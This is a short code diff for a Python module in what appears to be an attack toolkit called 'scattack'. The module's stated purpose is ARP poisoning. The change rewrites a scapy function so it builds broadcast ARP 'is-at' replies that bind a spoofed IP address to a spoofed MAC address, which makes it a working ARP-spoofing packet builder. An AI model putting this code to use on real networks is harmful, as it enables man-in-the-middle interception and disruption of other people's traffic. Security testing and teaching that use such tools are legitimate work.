@@ -1,10 +1,12 @@
 """This module is responsible for ARP poisoning."""
 
-from scapy.layers.l2 import ARP, Ether, Packet
+from scapy.layers.l2 import ARP, Ether, Packet, Net
+
+from scattack.core.utils import ETHER_ANY, ETHER_BROADCAST
 
 
 def create_arppoison_packet(
-    target_mac: str, target_ip: str, spoofed_ip: str, spoofed_mac: str | None = None
+    target_ip: str, spoofed_ip: str, spoofed_mac: str | None = None
 ) -> Packet:
     """Create ARP packet.
 
@@ -14,7 +16,10 @@ def create_arppoison_packet(
         spoofed_ip (str): IP address of the spoofed IP address
     Returns:
         Ether: ARP packet"""
-    ether_opts: dict = {"src": spoofed_mac} if spoofed_mac else {}
-    return Ether(dst=target_mac, **ether_opts) / ARP(
-        op="who-has", psrc=spoofed_ip, pdst=target_ip
+    return Ether(dst=ETHER_BROADCAST, src=spoofed_mac) / ARP(
+        op="is-at",
+        psrc=spoofed_ip,
+        pdst=target_ip,
+        hwdst=ETHER_ANY,
+        hwsrc=spoofed_mac,
     )
